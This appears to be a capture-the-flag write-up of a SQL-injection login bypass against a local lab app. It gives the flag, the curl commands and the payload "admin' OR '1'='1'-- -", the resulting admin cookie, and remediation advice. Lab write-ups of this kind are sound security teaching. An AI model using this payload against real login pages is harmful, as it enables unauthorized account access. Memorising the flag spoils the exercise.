# Finding 1: SQL Injection — Login Bypass

**Flag:** `FLAG{sqli_66d8b88aab83}`

## Steps

1. Baseline request with bogus credentials confirmed a normal failed-login page
   (HTTP 200, stays on login form):
   ```
   curl -i -X POST http://127.0.0.1:5050/login -d "username=nope&password=wrong"
   ```

2. Submitted a classic SQL-injection payload in the `username` field to break
   out of the query's string literal and force the WHERE clause to always be
   true, commenting out the rest of the original query:
   ```
   curl -i -c cookies.txt -X POST http://127.0.0.1:5050/login \
     --data-urlencode "username=admin' OR '1'='1'-- -" \
     --data-urlencode "password=x"
   ```

3. Server responded `302 FOUND` → `/dashboard`, and set:
   ```
   Set-Cookie: auth=YWRtaW46YWRtaW4=; Path=/
   ```
   (`base64decode("YWRtaW46YWRtaW4=")` = `admin:admin` — the app authenticated
   us as the first row the injected query matched, i.e. the admin account,
   with no valid password check.)

4. Followed the session cookie to `/dashboard`:
   ```
   curl -b cookies.txt http://127.0.0.1:5050/dashboard
   ```
   Response included:
   ```
   Signed in as admin (role: admin).
   Nice work bypassing the login. FLAG{sqli_66d8b88aab83}
   ```

## Root cause
The login query concatenates user input directly into SQL instead of using
parameterized queries/prepared statements, so `'` in the input breaks out of
the intended string literal and lets an attacker inject arbitrary SQL logic.

## Remediation
- Use parameterized queries (e.g. `cursor.execute("... WHERE username=? AND password=?", (u, p))`)
  for all database access — never string-format or concatenate user input into SQL.
- Hash and salt stored passwords (bcrypt/argon2) rather than comparing plaintext.
- Add login-attempt rate limiting / account lockout to slow brute-force and
  injection probing.
